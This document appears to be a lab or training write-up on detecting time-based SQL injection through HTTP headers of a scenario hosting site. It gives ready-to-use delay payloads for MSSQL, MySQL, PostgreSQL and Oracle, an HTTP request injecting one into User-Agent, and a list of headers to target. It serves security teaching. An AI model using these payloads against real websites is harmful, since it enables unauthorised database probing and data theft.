# ⏱️ Identifying Time-based SQLi

## Scenario

**Target**: Digcraft Hosting - Main website  
**Challenge**: No visible input fields on the page

---

## Reconnaissance

### Page Analysis

Website shows pricing plans - no forms or input fields visible.

**Don't forget to test HTTP headers!**

### Headers to Test

| Priority | Header | Reason |
|----------|--------|--------|
| 1st | Custom headers | Surely used by server |
| 2nd | `Host` | Common injection point |
| 3rd | `User-Agent` | Often logged/processed |
| 4th | `X-Forwarded-For` | Proxy/logging usage |
| 5th | `Referer` | Analytics tracking |
| 6th | `Cookie` | Session handling |

---

## Time-based Injection Payload

### MSSQL Payload

```sql
';WAITFOR DELAY '0:0:10'--
```

### How It Works

| Keyword | Purpose |
|---------|---------|
| `'` | Close existing string |
| `;` | End current statement |
| `WAITFOR DELAY` | Block query execution |
| `'0:0:10'` | Wait 10 seconds (H:M:S) |
| `--` | Comment out rest |

---

## Testing Headers

### Inject in User-Agent

```http
GET / HTTP/1.1
Host: <TARGET>
User-Agent: ';WAITFOR DELAY '0:0:10'--
Accept: */*
```

### Result

| Payload | Response Time |
|---------|---------------|
| `';WAITFOR DELAY '0:0:10'--` | **10,013 ms** ⚠️ |
| Normal User-Agent | **9 ms** |

**10 second delay = SQLi confirmed!**

---

## Verification

Always verify by testing:

1. **With delay** → Response takes ~10 seconds
2. **Without delay** → Response is immediate

This confirms the delay is caused by your payload, not server issues.

---

## Time-based Payloads by Database

| Database | Payload |
|----------|---------|
| **MSSQL** | `WAITFOR DELAY '0:0:10'` |
| **MySQL/MariaDB** | `AND (SELECT SLEEP(10) FROM dual WHERE database() LIKE '%')` |
| **PostgreSQL** | `\|\| (SELECT 1 FROM PG_SLEEP(10))` |
| **Oracle** | `AND 1234=DBMS_PIPE.RECEIVE_MESSAGE('RaNdStR',10)` |

---

## Complete Payload Examples

### MSSQL

```sql
-- In string context
';WAITFOR DELAY '0:0:5'--

-- Conditional delay
'; IF (1=1) WAITFOR DELAY '0:0:5'--

-- After numeric input
1; WAITFOR DELAY '0:0:5'--
```

### MySQL

```sql
-- Sleep function
' AND SLEEP(5)--

-- Conditional sleep
' AND IF(1=1, SLEEP(5), 0)--

-- Benchmark (alternative)
' AND BENCHMARK(10000000, SHA1('test'))--
```

### PostgreSQL

```sql
-- pg_sleep
'; SELECT pg_sleep(5)--

-- Conditional
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

### Oracle

```sql
-- DBMS_PIPE
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--

-- Heavy query (alternative)
' AND (SELECT COUNT(*) FROM all_objects a, all_objects b) > 0--
```

---

## Detection Tips

### Choosing Delay Time

| Delay | Use Case |
|-------|----------|
| **5 seconds** | Quick testing |
| **10 seconds** | Clear distinction |
| **2-3 seconds** | High-latency networks |

### False Positives

Watch out for:
- Slow server response
- Network latency
- Rate limiting delays

**Always compare** injected vs non-injected response times.

---

## Common Injection Points

### HTTP Headers

```http
User-Agent: payload
X-Forwarded-For: payload
Referer: payload
Cookie: session=payload
Host: payload
Accept-Language: payload
```

### Less Obvious Locations

```
Custom headers (X-*)
API keys in headers
JWT tokens (if decoded and used in query)
```

---

## Quick Reference

### MSSQL Delay Syntax

```sql
WAITFOR DELAY 'hours:minutes:seconds'
```

### Time Format Examples

| Format | Duration |
|--------|----------|
| `'0:0:5'` | 5 seconds |
| `'0:0:10'` | 10 seconds |
| `'0:1:0'` | 1 minute |
| `'0:0:0.5'` | 500 ms |

---

## Next Steps

- [Time-based Oracle Design](designing-time-oracle.md)
- [Conditional Time Extraction](conditional-extraction.md)

